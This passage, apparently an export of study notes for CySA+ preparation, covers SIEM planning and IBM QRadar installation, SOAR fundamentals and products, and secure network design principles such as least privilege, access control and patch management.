advance.\n\n\nIntegration Planning\nDetermining Integration Points:\n\n\nStart by listing the systems, applications, and devices SIEM needs to be integrated with.\n\n\nSpecifically, identify sources that produce log information and other security event data.\n\n\nResearching Integration Methods:\n\n\nResearch the integration methods supported by the SIEM solution (i.e. API, Syslog, agent-based, agent-less, etc.).\n\n\nDetermining Special Integration Requirements:\n\n\nIdentify systems that require non-standard integration or require a custom integration adapter or module.\n\n\nTesting the Integration:\n\n\nPerform all integrations in the test environment.\n\n\nThis way, you can verify whether data collection, normalization, and other processes are working correctly.\n\n\nConsidering Data Formats and Normalization:\n\n\nEvaluate data formats from different sources and how to normalize them.\n\n\nPlanning Automation and Workflows:\n\n\nPlan how the SIEM solution will integrate with your existing workflows to automatically react to security incidents.\n\n\nThe integration process is critical to ensuring the SIEM reaches its full potential. Therefore, careful and thorough planning during this process will help prevent potential problems in the long run."},"SOC/Cysa+-Prep/SIEM-Basics,-Installation-and-Configuration/SIEM-Installation-and-Configuration":{"slug":"SOC/Cysa+-Prep/SIEM-Basics,-Installation-and-Configuration/SIEM-Installation-and-Configuration","filePath":"SOC/Cysa+ Prep/SIEM Basics, Installation and Configuration/SIEM Installation and Configuration.md","title":"SIEM Installation and Configuration","links":[],"tags":[],"content":"The complex cyber threats faced by organizations today necessitate the adoption of advanced security tools. This is where Security Information and Event Management (SIEM) systems come into play. SIEM collects and analyzes security event information collected from various sources of the organization at a central point and alerts for appropriate actions.\nProper installation and configuration are essential for the SIEM to function successfully. First, the technical needs (both software and hardware) of the system must be accurately evaluated. The next steps include properly distributing the system’s data collection agents, integrating log sources, and normalizing log formats.\nOnce the SIEM setup is completed, the main task is to configure the system correctly. Event correlation, definition of alarms and warnings, reporting, and dashboard configurations are done at this stage. A continuous performance monitoring and optimization process should also be initiated. This enables early diagnosis of potential problems in the system and ensures that the SIEM solution is constantly operating at peak performance.\nAbout SIEM Installation and Configuration\nThe SIEM installation and configuration process may vary depending on the needs of the organization and the SIEM product used. However, by presenting a general approach, the technical steps to be followed in this process and the topics to be considered can be listed as follows:\nPreliminary\n\n\nDetermining the Technical Requirements\n\n\nCompatible Hardware and Software Controls\n\n\nExamining Network Topology\n\n\nInstalling SIEM Software\n\n\nSelection of Distribution Models (Centralized vs. Distributed)\n\n\nApplying Necessary Updates and Patches\n\n\nLicensing and Onboarding Settings\n\n\nData Collection and Integration\n\n\nIdentification and Integration of Log Sources\n\n\nDistribution of Collection Agents\n\n\nData Normalization and Enrichment\n\n\nConfiguration\n\n\nCreating Log Correlation Rules\n\n\nAlert and Alarm Settings\n\n\nReporting and Dashboard Configurations\n\n\nOptimization and Fine Tuning\n\n\nPerformance Monitoring\n\n\nReviewing Alarm Sensitivity Settings\n\n\nManagement of System Updates and Patches\n\n\nBackup and Disaster Recovery Planning\n\n\nPeriodic Backup Settings\n\n\nTesting Disaster Recovery Scenarios\n\n\nDevelopment of Data Backup and Archiving Strategy\n\n\nThese steps technically represent a general approach to installation and configuration. When using a custom SIEM product, it is important to follow the product’s documentation and best practices. This will make the installation and configuration process more effective and hassle-free. Additionally, depending on the specific needs of each organization, some of these steps can be examined more in depth or the process can be expanded by adding additional steps.\nNote : This course will include a demonstration of SIEM installation, with the IBM QRadar SIEM solution chosen as the sample SIEM solution.\nIBM QRadar SIEM Setup\nIBM QRadar is an industry-renowned SIEM solution. Installing QRadar typically involves several steps, and you must meet certain hardware and software requirements.\nRequirements\nHardware Requirements\nRecommended hardware specifications for QRadar can be found in IBM’s official documentation. This usually includes adequate CPU, memory, and storage capacity. The performance of the server on which the installation is made depends on the amount of logs to be processed. Minimum resource requirements are 8 core CPU, 16 GM RAM, and 300 GB disk. This resource can be virtual or physical.\nSoftware Requirements\nQRadar is designed to run on specific operating systems such as some versions such as Red Hat Enterprise Linux. Additionally, it is recommended not to have any other software on the system.\nNetwork Requirements\nProper network configuration of the QRadar server must be made during installation. This is necessary for the server to collect data from log sources and other components.\nInstallation Steps\nAfter the requirements are prepared, you can start the installation phase. Hardware requirements can be physical or virtual. You should prepare the necessary source, boot the system with the Qradar installation ISO file, and build Qradar on Redhat distribution.\nStep 1: Select “Install Red Hat Enterprise Linux 7.9” to start an installation with a graphical display.\n\nStep 2: After the installation files are loaded, type “yes” to accept the license and continue by pressing “enter”.\n\nStep 3: Select the “Software Install” option and click “Next”.\nAppliance Install: An installation option optimized for pre-configured QRadar devices with custom hardware, providing an integrated hardware-software solution.\nSoftware Install: A software-based version of QRadar, typically designed for direct installation on virtual machines or existing hardware.\nHigh Availability Appliance: It is a backup device that automatically activates to guarantee the continuous operability and data integrity of QRadar in case the primary device fails.\nApp Host Appliance: An installation option specifically designed for additional applications to run on QRadar, thus adding additional functions to the core SIEM functionality.\nData Gateway Appliance: It is a component designed to collect log and event data from different network segments or geographical locations and direct it to the main QRadar system.\n\nStep 4: Select “All-In-One Console” and click “Next”.\nAll-in-one console: An installation form that combines all the core components of QRadar (acquisition, processing, and console functions) in a single device. Suitable for small and medium-sized organizations.\nData Node: Used to store and search large amounts of data. It is added to increase data storage capacity.\nEvent Collector: Collects log and event data from various devices and applications on the network, performs initial analysis, and sorts this data to transmit it to one or more event processors.\nEvent Processor: Processes collected event data, applies correlation rules, and stores events.\nEvent/Flow Processor: A component designed to process both event and network flow data. This allows QRadar to process both log and network flow data at a central point.\nFlow Collector: Collects network flow data, performs light processing on this data and routes it to one or more flow processors.\nFlow Processor: Processes the network flow data collected by the Flow Collector, applies correlation rules, and stores the flows.\nQVM Processor: Performs central processing for the QRadar Vulnerability Manager (QVM). It is used to identify and analyze vulnerabilities in the system.\nQVM Scanner: Identifies potential vulnerabilities by scanning the network.\nQVM Appliance: A standalone appliance that includes all the functionality of QRadar Vulnerability Manager providing a central point for vulnerability scans, risk assessments, and vulnerability management.\n\nStep 5: Select the “normal” installation option.\n\nStep 6: Set the Date and Time or enter the time server IP address.\n\nStep 7: Select the country for the time zone.\n\nStep 8: Select a City or Region.\n\nStep 9: IP version and config settings (if necessary) are selected and set.\n\nStep 10: Select Management Interface.\n\nStep 11: Enter the hostname, IP address, netmask, gateway, and DNS addresses and click the “Next” button.\n\nStep 12: Create the admin password of the server.\n\nStep 13: Create the root password of the server.\n\nStep 14: After the installation is completed, you will be logged into the terminal automatically.\n\nStep 15: After the installation is completed, you can access the web interface from the browser with “ https://[Qradar_IP_ Address]” and log in with the admin username and password specified during installation.\n\nStep 16: After the first login, you need to change the password of the admin user.\n\nStep 17: You need to accept the license agreement.\n\nStep 18:  A default dashboard screen as below will be displayed.\n"},"SOC/Cysa+-Prep/SIEM-Basics,-Installation-and-Configuration/To-Do-List-after-SIEM-Installation":{"slug":"SOC/Cysa+-Prep/SIEM-Basics,-Installation-and-Configuration/To-Do-List-after-SIEM-Installation","filePath":"SOC/Cysa+ Prep/SIEM Basics, Installation and Configuration/To-Do List after SIEM Installation.md","title":"To-Do List after SIEM Installation","links":[],"tags":[],"content":"Licensing\nThe license key must be added before running QRadar to activate all features of the product.\nYou can define the configurations via QRadar → Admin → System Configuration → System and License Management screen.\n\nDefining Log Sources\nYou should define from which log sources QRadar will receive data (Servers, network devices, security devices, etc.).\nNote : We will cover this topic as a separate course.\nYou can define the log sources via the QRadar → Admin → Data Sources → Events → Log Sources screen.\n\nData Retention Policies\nYou should determine how long the log and flow data will be stored.\nYou can define configurations via \n“QRadar → Admin → Data Sources → Events → Event Retention (default is 1 month)\nQRadar → Admin → Data Sources → Flows → Flow Retention” screens.\n\nUser and Role Management\nYou should restrict user actions by defining access permissions for different users and roles.\nYou can make configurations through the QRadar → Admin → User Management → Users and User Roles screens.\n\n\nNetwork Hierarchy Definitions\nQRadar’s Network Hierarchy feature is a model that reflects the network structure of your organization and helps QRadar accurately classify and analyze events, flows, and attacks.\nYou can make definitions via the QRadar → Admin → System Configuration → Network Hierarchy screen.\n\nUpdates and Patches\nYou should check official releases from IBM regularly to keep your version of QRadar up to date and to apply all security patches.\nYou can check the updates via QRadar → Admin → System Configuration → Auto Update screen.\n\nEmail Server Settings\nYou can follow the steps below to configure email settings in IBM QRadar. These steps are required for QRadar to send alarm emails.\nSMTP settings can be made via QRadar → Admin → Email Server Management screen.\nTo add a new SMTP server on this screen, you can define a new SMTP server by clicking the “Add” button and entering IP/hostname, port, and if necessary user and pass information.\nSince QRadar contains an SMTP Server in its default installation, this SMTP server is used by default.\n\nQRadar will now send alarm emails via the SMTP server configured. These settings help QRadar quickly report security incidents and provide a timely response to your security team.\nGrouping Log Sources\n“Log Source Group” in IBM QRadar is a feature used to group and organize security events or log sources of a specific type or source. This feature enhances the management and analysis of security events and logs.\nLog sources can be defined via QRadar → Admin → Data Sources → Events → “Log Sources Groups” screen.\nSelect the source on the “QRadar → Admin → Data Sources → Events → Log Sources” screen and click “Edit” to add the servers to the created groups. You can then choose the added groups from the group section.\n\nAdding a log source to the group:\n\nSystem Settings\nQRadar’s “System Settings” section contains a number of basic system configuration and management functions. Here’s what each of these headings does and what settings you can make:\nSystem Settings : This is the section where basic system settings are configured. It contains the general configuration and settings of QRadar.\nDatabase Settings : Includes QRadar’s database management. Database-related settings such as database logs, automation, and performance settings are included here.\nAriel Database Settings : Used to configure QRadar’s Ariel database which is a component used to store query events and stream data.\nSNMP Settings : Allows configuration of Simple Network Management Protocol (SNMP) settings and enables QRadar to interact and monitor via SNMP.\nEmbedded SNMP Daemon Settings : Contains settings related to the embedded SNMP service (daemon) which is used by SNMP clients.\nConsole Settings : Used to configure the user interface allowing users to customize the appearance and behavior of the console interface.\nWINS Settings : Allows configuration of Windows Internet Naming Service (WINS) settings. WINS is a service that translates the names of systems on the network into IP addresses.\nReporting Settings : Used to configure QRadar’s reporting functions. Time periods for reports, background process settings, and other reporting features are set here.\nData Export Settings : Contains the settings used to export QRadar data and makes it easier to transfer data to other systems or storage units.\nQFlow Settings: This is used for configuring QFlow features, which are used to collect and analyze QRadar’s flow data.\nQRadar Network Insights Settings : Used to configure the QRadar Network Insights component which is used for network traffic analysis and threat detection.\nGeographic Settings : Used to configure QRadar’s geographic maps and location information and helps in geographical tracking of threats on the network.\n\nAuthorized Service Management\nAuthorize Service Management section helps you create the token information required by applications such as Wincollect and Use Case Manager, which are necessary when using QRadar. The tokens created here will be provided to you upon creation. You must save them because they won’t be retrievable within the system once created.\n\nConclusion\nThese steps mark just the initial phase of setting up QRadar and getting the most out of it. However, effective use of QRadar requires constant monitoring, review, and adjustment."},"SOC/Cysa+-Prep/SIEM-Basics,-Installation-and-Configuration/index":{"slug":"SOC/Cysa+-Prep/SIEM-Basics,-Installation-and-Configuration/index","filePath":"SOC/Cysa+ Prep/SIEM Basics, Installation and Configuration/index.md","title":"index","links":["SOC/Cysa+-Prep/SIEM-Basics,-Installation-and-Configuration/Introduction-to-SIEM","SOC/Cysa+-Prep/SIEM-Basics,-Installation-and-Configuration/SIEM-Components","SOC/Cysa+-Prep/SIEM-Basics,-Installation-and-Configuration/SIEM-Installation-Planning--2","SOC/Cysa+-Prep/SIEM-Basics,-Installation-and-Configuration/Common-SIEM-Products","SOC/Cysa+-Prep/SIEM-Basics,-Installation-and-Configuration/SIEM-Installation-Planning","SOC/Cysa+-Prep/SIEM-Basics,-Installation-and-Configuration/SIEM-Installation-and-Configuration","SOC/Cysa+-Prep/SIEM-Basics,-Installation-and-Configuration/To-Do-List-after-SIEM-Installation"],"tags":[],"content":"1. Introduction to SIEM\n2. SIEM Components\n3. SIEM Installation Planning -2\n4. Common SIEM Products\n5. SIEM Installation Planning\n6. SIEM Installation and Configuration\n7. To-Do List after SIEM Installation"},"SOC/Cysa+-Prep/SOAR-Fundamentals/Main-Components-of-SOAR-and-Common-Products":{"slug":"SOC/Cysa+-Prep/SOAR-Fundamentals/Main-Components-of-SOAR-and-Common-Products","filePath":"SOC/Cysa+ Prep/SOAR Fundamentals/Main Components of SOAR and Common Products.md","title":"Main Components of SOAR and Common Products","links":[],"tags":[],"content":"Orchestration\nOrchestration ensures coordination between different security tools, systems, and processes to respond to security incidents. Without automation, many different steps must be performed manually to address a security incident. Orchestration provides speed and efficiency by automating these processes.\nAutomation\nAutomation involves automating security tasks that are repetitive or need to be performed on a regular basis. For example, when a threat is detected, the automation process can automatically perform tasks such as isolating the threat, analyzing it, or updating systems.\nResponse\nSOAR provides the ability to respond quickly and effectively to security incidents. This may include actions such as resolving the incident, isolating it, cleaning malware, or recovering affected systems. Response processes are frequently automated based on established policies and procedures.\nUltimately, SOAR represents a combination of tools and processes designed to make security operations more effective and efficient. This approach is crucial to addressing the complexity of cybersecurity threats, reducing human errors and improving security with rapid responses. SOAR can be particularly useful for large-scale organizations and cybersecurity teams because it can help them deal with large amounts of security incidents and data.\nThe planning phase is very important for a SOAR that works correctly and efficiently.\nCommon SOAR Products\nThere are many SOAR products on the market today, and while they all have their pros and cons, they all share the core goal of helping organizations automate and coordinate security operations.\nWhen you evaluate it together with your needs and budget during the planning phase, one or more of the following products will be the right option for you:\n\n\nPalo Alto Networks Cortex XSOAR\n\n\nSplunk SOAR\n\n\nIBM Security QRadar SOAR\n\n\nChronicle SOAR (Google)\n\n\nFortinet FortiSOAR\n\n\nRapid7 InsightConnect\n\n\nSwimlane Turbine\n\n\nTheHive\n\n\nServiceNow Security Operations\n\n\nResolve Actions\n\n\nRevelstoke SOAR\n\n\nMicrosoft Sentinel\n\n\nThese are the main products in the market, and new products, large and small, continue to enter the market."},"SOC/Cysa+-Prep/SOAR-Fundamentals/SOAR-Human-Resources":{"slug":"SOC/Cysa+-Prep/SOAR-Fundamentals/SOAR-Human-Resources","filePath":"SOC/Cysa+ Prep/SOAR Fundamentals/SOAR Human Resources.md","title":"SOAR Human Resources","links":[],"tags":[],"content":"The human resources required for a SOAR product to operate functionally will vary depending on the size and complexity of the organization and the complexity of the SOAR product. However, in general, the following human resource roles are required:\nSOAR Product Manager\nA person who understands the needs of the organization’s security operations and can configure the SOAR product according to those needs. This role also typically takes responsibility for the SOAR product procurement and deployment process.\nSOAR Product Specialist\nKnows the features and capabilities of the SOAR product and knows how to use them in the organization’s security operations. This role typically provides the training required to use the SOAR product and is responsible for training teams using the SOAR product.\nIncident Response Specialist\nInvestigates and responds to incidents. This role automatically detects and responds to incidents, typically using the incident response capabilities of the SOAR product.\nSecurity Analyst\nMonitors and analyzes threats. This role detects and analyzes threats, typically using the SOAR product’s threat intelligence capabilities.\nSecurity Engineer\nInstalls and manages security tools and systems. This role is typically responsible for the integration of the SOAR product with security tools and systems.\nAt least one person in each of the roles we have listed is the minimum requirement for a healthy SOAR project, and some organizations may need the following additional human resource roles to increase the functionality of the SOAR product:\nSOAR Product Development Specialist\nSOAR has the technical expertise necessary to customize and extend its product.\nSOAR Support Specialist\nProvides technical support to SOAR product users.\nSOAR Documentation Specialist\nCreates user manuals and other documentation for the SOAR product."},"SOC/Cysa+-Prep/SOAR-Fundamentals/SOAR-Planning-and-Sustainment---2":{"slug":"SOC/Cysa+-Prep/SOAR-Fundamentals/SOAR-Planning-and-Sustainment---2","filePath":"SOC/Cysa+ Prep/SOAR Fundamentals/SOAR Planning and Sustainment - 2.md","title":"SOAR Planning and Sustainment - 2","links":[],"tags":[],"content":"Developing the Implementation Plan\nA plan must be developed to implement the SOAR solution. This plan should describe how the solution will be installed, integrated, and used.\n\n\nDetermine the steps required to implement the SOAR solution in the organization’s production environment.\n\n\nDevelop a plan to integrate the SOAR solution with existing security tools and processes.\n\n\nDevelop a training plan so security teams can use the SOAR solution effectively.\n\n\nDevelop a testing plan to verify that the SOAR solution is working smoothly.\n\n\nDevelop a plan to manage and maintain the SOAR solution.\n\n\nDoing some things wrong at the planning stage will have irreparable consequences in the future. Therefore, you should definitely consider the following issues when developing your implementation plan:\n\n\nThe implementation plan should be a document that explains in detail how the solution will be implemented and used.\n\n\nThe implementation plan should be prepared taking into account the organization’s existing resources and capabilities.\n\n\nThe implementation plan should be updateable in case requirements change.\n\n\nApplication and Testing\nThe SOAR solution must be implemented and tested in the organization’s production environment. This is necessary to verify that the solution works smoothly and meets the needs of the organization.\n\n\nIdentify scenarios in which the SOAR solution will be tested. These scenarios need to represent the organization’s actual security operations.\n\n\nCreate a test environment to test the SOAR solution. This environment should be similar to the production environment. Create a test environment with the awareness that the need for a test environment for SOAR will never disappear. Remember, SOAR is a living structure and requires constant development, and these developments need testing.\n\n\nImplement the developed test cases and monitor the results.\n\n\nAnalyze test results to determine where the solution needs improvement.\n\n\nManagement and maintenance\nThe SOAR solution must also be managed once implemented. This ensures that the solution is kept up to date, protected against threats, and aligned with the needs of the organization.\nIn summary, here are some things to consider when planning for SOAR:\n\n\nThe SOAR solution must be tailored to the specific needs of the organization. SOAR solutions have different features and capabilities. A solution that meets the needs of the organization must be selected.\n\n\nThe SOAR solution must be compatible with the organization’s existing security tools and processes. The SOAR solution must be able to integrate with existing security tools and be compatible with existing security processes.\n\n\nThe SOAR solution should be used in conjunction with the training and support of the organization’s security teams. Training and support must be provided for security teams to use the SOAR solution effectively.\n\n\nPlanning for SOAR helps increase the efficiency and effectiveness of the organization’s cybersecurity operations. Good planning ensures that the organization gets the most out of the SOAR solution."},"SOC/Cysa+-Prep/SOAR-Fundamentals/SOAR-Planning-and-Sustainment":{"slug":"SOC/Cysa+-Prep/SOAR-Fundamentals/SOAR-Planning-and-Sustainment","filePath":"SOC/Cysa+ Prep/SOAR Fundamentals/SOAR Planning and Sustainment.md","title":"SOAR Planning and Sustainment","links":[],"tags":[],"content":"Planning for SOAR should be done taking into account the needs and objectives of the organization’s security operations. The basic steps of the planning process are:\nIdentifying Real Needs and Goals\nIt is necessary to determine the current status and future goals of the organization’s security operations. This starts with understanding the organization’s cybersecurity risks, existing security tools and processes, and the needs of security teams.\nDetermining the true needs and goals for SOAR begins with understanding the current state and future goals of the organization’s security operations. This starts with understanding the organization’s cybersecurity risks, existing security tools and processes, and the needs of security teams.\n\n\nAssess the organization’s risks from cybersecurity threats. Doing this will help you understand which assets of the organization are at risk and what threats there are to those assets.\n\n\nEvaluate existing security tools and processes. Evaluate the organization’s current security tools and processes. Doing this will help you understand how the organization’s current security operations are working and what deficiencies exist.\n\n\nAssess the needs of security teams. Assess the needs of the organization’s security teams. Doing this will help you understand what tasks security teams need help with and what tools and training they need.\n\n\nAfter completing these steps, the real needs and goals of the organization will be determined. This information will help the organization develop a plan for the SOAR solution.\nThere are topics you should pay attention to when determining the real needs and goals for SOAR:\n\n\nBe realistic. Determine your organization’s needs and goals, taking into account available resources and capabilities.\n\n\nBe measurable. Make your goals measurable so you can track your progress.\n\n\nThink long term. A SOAR solution should help improve your organization’s cybersecurity operations in the long term.\n\n\nIdentifying the real needs and goals for SOAR will help the organization get the most out of the SOAR solution.\n\n\nEvaluating the SOAR Solution\nThere are many large and small SOAR solutions on the market today. These products can include different features for workloads of different scales. Some of them can work only on Prem, some only on Cloud, and some on both On Prem and Cloud. Taking all these variables into consideration, a SOAR solution that meets the needs of the organization should be selected.\n"},"SOC/Cysa+-Prep/SOAR-Fundamentals/What-is-SOAR":{"slug":"SOC/Cysa+-Prep/SOAR-Fundamentals/What-is-SOAR","filePath":"SOC/Cysa+ Prep/SOAR Fundamentals/What is SOAR.md","title":"What is SOAR","links":[],"tags":[],"content":"Security Orchestration and Response (SOAR) is a cybersecurity technology that stands for Security Orchestration, Automation and Response. SOAR platforms help security teams by collecting and analyzing data from different security tools and providing automated responses based on this data.\n\nSOAR platforms help increase the efficiency and effectiveness of security operations. Additionally, it allows security teams to focus on more complex threats.\nSome key features of SOAR platforms are:\n\n\nCollect and analyze data from different security tools\n\n\nAutomatically prioritize and assign security incidents\n\n\nRespond automatically to security incidents\n\n\nProvide reports and analytics for security operations\n\n\nSOAR platforms are useful for organizations of all sizes. However, the use of SOAR platforms is important, especially for organizations with large and complex IT infrastructures.\n\n\nSome benefits of SOAR platforms include:\n\nIncrease the efficiency and effectiveness of security operations.\nAllow security teams to focus on more complex threats.\nProvide faster response to security incidents.\nReduce security risk.\nReduce security costs.\nSOAR platforms are becoming an important part of cybersecurity operations. In today’s complex cybersecurity environment, SOAR platforms help security teams work more effectively.\n"},"SOC/Cysa+-Prep/SOAR-Fundamentals/index":{"slug":"SOC/Cysa+-Prep/SOAR-Fundamentals/index","filePath":"SOC/Cysa+ Prep/SOAR Fundamentals/index.md","title":"index","links":["SOC/Cysa+-Prep/SOAR-Fundamentals/What-is-SOAR","SOC/Cysa+-Prep/SOAR-Fundamentals/Main-Components-of-SOAR-and-Common-Products","SOC/Cysa+-Prep/SOAR-Fundamentals/SOAR-Planning-and-Sustainment","SOC/Cysa+-Prep/SOAR-Fundamentals/SOAR-Planning-and-Sustainment---2","SOC/Cysa+-Prep/SOAR-Fundamentals/SOAR-Human-Resources"],"tags":[],"content":"1. What is SOAR\n2. Main Components of SOAR and Common Products\n3. SOAR Planning and Sustainment\n4. SOAR Planning and Sustainment - 2\n5. SOAR Human Resources"},"SOC/Cysa+-Prep/Secure-Network-Design/Functional-Separation-and-the-Principles-of-the-Least-Privilege":{"slug":"SOC/Cysa+-Prep/Secure-Network-Design/Functional-Separation-and-the-Principles-of-the-Least-Privilege","filePath":"SOC/Cysa+ Prep/Secure Network Design/Functional Separation and the Principles of the Least Privilege.md","title":"Functional Separation and the Principles of the Least Privilege","links":[],"tags":[],"content":"Another crucial aspect of designing a secure network involves the proper application of functional separation and the principle of the least privilege.\nUsers should have limited access to the functions and data they need. The principles of functional separation and the least privilege minimize the risk of unauthorized access.\nLet’s review the basics of these two principles:\nFunctional Separation (Separation of Duties):\n\n\nThe principle of functional separation refers to the division of the permissions required to perform a task between people or roles.\n\n\nThis principle aims to prevent a single person or role from being able to perform all the tasks and to prevent potential malicious activities.\n\n\nFunctional separation helps to prevent errors and malicious activities and increases the effectiveness of internal audits.\n\n\nFor instance, when an individual initiates a task, another person might be required to authorize or finalize it.\n\n\nThe Least Privilege:\n\n\nThe principle of the least privilege is simply providing users or roles only the minimum privileges necessary for their duties.\n\n\nIt’s crucial to ensure that a user or role is not granted permissions beyond what is necessary for their tasks.\n\n\nThis principle prevents data breaches and improves network security by limiting the authorization level.\n\n\n\n(Image Source: blog.grantmcgregor.co.uk/what-is-the-principle-of-least-privilege-and-should-you-be-following-it)\nNow that we know about these principles, let’s see how can practice these principles. We should simply follow the steps below:\nRole and Authority Analysis:\n\n\nRoles, and permissions possessed by these roles are determined in order to ensure the functional separation.\n\n\nRoles represent the functions that users need to perform their tasks.\n\n\nThe minimum privilege that’s required to perform the functions of each role is determined.\n\n\nCreating Authorization Policies:\n\n\nAccording to the principle of the least privilege, authorization policies are designed for each user or role.\n\n\nPolicies give users or roles only the minimum powers they need.\n\n\nPolicies are determined based on functions and tasks and prevent users from accessing unnecessary permissions.\n\n\nImplementation of Access Control Mechanisms:\n\n\nThe principles of functional separation and the least privilege are applied through access control mechanisms.\n\n\nAccess control mechanisms ensure that users or roles can only perform actions that are appropriate to their roles.\n\n\nThese mechanisms can be implemented through authorization management, role-based access control (RBAC), permission settings, network firewalls, and so on.\n\n\nThe principles of functional separation and the least privilege play a vital role in enhancing data security, avoiding errors and malicious activities, and ensuring the efficiency of internal audits. These principles ensure that users or roles are granted with only the necessary privileges to carry out their tasks."},"SOC/Cysa+-Prep/Secure-Network-Design/Identification-and-Remediation-of-Weak-Links":{"slug":"SOC/Cysa+-Prep/Secure-Network-Design/Identification-and-Remediation-of-Weak-Links","filePath":"SOC/Cysa+ Prep/Secure Network Design/Identification and Remediation of Weak Links.md","title":"Identification and Remediation of Weak Links","links":[],"tags":[],"content":"The security measures we’ve covered so far aren’t one-time tasks; they require ongoing process and efforts as well as continuous assessment and improvement is also required. Following are some of the examples of these ongoing efforts that we should continue to implement and improve:\nDetection of Weak Passwords and Policies\nThe risks posed by weak passwords on the network security are quite significant. Weak passwords can seriously compromise the user’s security it also endangers the whole network security. For example, using a simple word or a basic combination of numbers increases the likelihood that an attacker will be able to guess your password. Attackers can use automated tools to quickly test thousands or even millions of password combinations. These brute-force attacks significantly increase the chances of success, especially in environments where the weak passwords are vulnerable.\n\nIn addition, weak passwords may be the root cause of your account to get compromised. They lay the groundwork for phishing attacks. Attackers may get passwords by misleading users through fake emails or websites. If the password is weak, they can easily access your account and make unauthorized operations without you even realizing it.\nWeak passwords can also cause data leaks. If your account gets accessed by an unauthorized person/user, your personal or company sensitive information may fall into the hands of attackers. This, in turn, can lead to privacy violations and potential data leaks.\nFor these reasons, it is important to use strong and complex passwords for a secure network design. Updating your passwords regularly and using additional security measures such as multi factor authentication also increases security.\nWeaknesses and Remedial Actions\nRegular penetration testing (pentesting) exercises replicate actual attack scenarios in order to evaluate the security posture of networks and systems and pinpoint potential vulnerabilities. Pentesting serves as an assessment tool to uncover weaknesses, evaluate risks, and implement necessary countermeasures.\nBy simulating real attack scenarios, pentesting identifies security vulnerabilities in networks and systems, in other words it highlights potential weak points that require mitigation. Following pentests, system administrators and security teams can address vulnerabilities, update security policies, and implement necessary security measures based on the findings of the pentest results.\nPentesting is a crucial process that evaluates the ability of networks and systems to withstand real-world attacks by simulating authentic attack scenarios. These tests effectively gauge the efficiency of security measures and work towards resolving any shortcomings. Moreover, the outcomes of pentesting provide valuable insights for assessing and prioritizing risks, guaranteeing proper resource allocation and efficient risk management.\nFurthermore, pentests serve to heighten security awareness within the organization. The results of these tests tangibly illustrate the actual impact of security vulnerabilities, encouraging employees and managers to be more attentive to security matters. Consequently, this cultivates an improved security culture, leading to an overall enhancement in the organization’s security posture.\nIn addition, conducting pentest on a regular basis proves the safety standards of the organization and gives confidence to customers and stakeholders. Pentest results increase the trust of customers and stakeholders in the security of the organization and raise the reputation. In many sectors, pentest is also required to meet compliance and regulatory requirements.\nFinally, you should keep in mind that conducting penetration tests alone is  not sufficient; promptly implementing corrective actions based on the test results is equally critical.\nUpdate and Patch Management\nUpdate and patch management are of vital importance for corporate network security. Update and patch management processes ensure that known vulnerabilities are remediated and systems are up to date with the latest security patches.\nUpdate and patch management allows you to troubleshoot vulnerabilities in operating systems, applications, and other components. Software and hardware providers regularly release updates and patches. Applying these updates regularly makes your systems secure against current threats.\n\n(Image Source: www.pcmag.com/how-to/computer-acting-up-how-to-uninstall-a-windows-10-update)\nUpdate and patch management reduces the attack surface created by outdated software or hardware components. Updates elimiinates security vulnerabilities and make your systems more resistant to attacks. In this way, potential attack points are minimized and defense mechanisms against vulnerabilities are strengthened.\nUpdating and patch management guarantees system compatibility and adherence to current standards. In numerous industries, meeting compliance and regulatory mandates holds the utmost significance. Regularly applying updates is essential to fulfill these requisites and ensure alignment with the relevant standards.\nUpdate and patch management enables businesses to respond to evolving security demands. As new security threats emerge or vulnerabilities are identified, updates and patches should be deployed and pushed to the endpoints quickly. This rapid and efficient response ensures effective mitigation against security vulnerabilities."},"SOC/Cysa+-Prep/Secure-Network-Design/Overview-of-Security-Principles":{"slug":"SOC/Cysa+-Prep/Secure-Network-Design/Overview-of-Security-Principles","filePath":"SOC/Cysa+ Prep/Secure Network Design/Overview of Security Principles.md","title":"Overview of Security Principles","links":[],"tags":[],"content":"Security principles are the foundations of a secure network infrastructure. In this section, we will cover the security principles and their best practice approaches in detail. \nFollowings are the foundational security principles that we will be covering in the training:\n\nAccess Control\nPrinciples of Functional Segregation and Least Privilege\nStrong Authentication Methods\nSession Management\nStatic and Dynamic Data\nDetection and Correction of Weak Links\n\nBefore we begin, a crucial point to remember is the utmost importance of adopting these approaches in every possible aspect, down to the tiniest element of our network.\nWe should remember that “The chain is as strong as its weakest link.”\n"},"SOC/Cysa+-Prep/Secure-Network-Design/Security-Principle--Access-Control":{"slug":"SOC/Cysa+-Prep/Secure-Network-Design/Security-Principle--Access-Control","filePath":"SOC/Cysa+ Prep/Secure Network Design/Security Principle- Access Control.md","title":"Security Principle- Access Control","links":[],"tags":[],"content":"The best way to understand the importance of the access control in designing a secure network is to start with an example.\nImagine you are managing a workplace. There are various departments, employees at various levels with different tasks in this workplace. Not everyone should have access to every document and information, right? Employees in the accounting department should not have access to human resources documents, and vice versa; individuals in human resources should not have access to accounting documents.\n\nThe same principle applies to a computer network. A network can be thought of as a workplace, where access control acts as a vigilant security guard. Access control governs the permissions for different individuals to access various information and resources within the network, specifying when and how they can do so.\nInadequate access control design can cause to unintended access to sensitive information by unauthorized individuals. This poses critical risks to the security of data, applications, and other resources within your network. This is just like leaving the doors wide open, allowing the unrestricted entry into and exit from the workplace for anyone.\nAn accurate access control design not only determines who can access which information, but also determines when and how users can access this information. This will help implement processes and policies better, comply with the regulations, and improve the overall security of your network.\nAnd remember that access control is crucial in safeguarding against both internal and external threats. While internal threats are often overlooked, they constitute a significant portion of security breaches, especially in larger organizations. Properly designing and implementing access control is vital in securing your network against both internal and external threats. The two common approaches to access control are RBAC (Role-Based Access Control) and ABAC (Attribute-Based Access Control). Now, let’s dive into each of these methods.\nRole-Based Access Control (RBAC)\n\nRole-based access control is used to determine users’ authorization levels and the resources they can access. This ensures that the principle of least privilege is followed and that data privacy is protected.\nRole-Based Access Control (RBAC) is an access control model that efficiently manages user or group access permissions to a system by assigning roles and associating them with specific permissions. RBAC is a highly effective and widely utilized method for controlling access to data within network infrastructures and systems.\nImplementation of RBAC\nDefining the Role:\n\n\nThe first step is to define roles in the system. A role represents the permissions a user can have.\n\n\nFor example, we can define the roles such as “Manager”, “Employee” or “Customer”.\n\n\nEach role represents a set of permissions that are determined based on the functions and responsibilities required by that role.\n\n\nAssigning Users to Roles:\n\n\nEach user is assigned a role that limits access to the system and specifies the defined roles.\n\n\nPermissions are granted to users based on their assigned roles.\n\n\nUsers are assigned appropriate roles based on their work requirements and responsibilities.\n\n\nAuthorization and Definition of Permissions:\n\n\nFor each role, the permissions granted to users to perform the operations required by the role are determined.\n\n\nPermissions determine the actions users can perform, the data they can access, and the 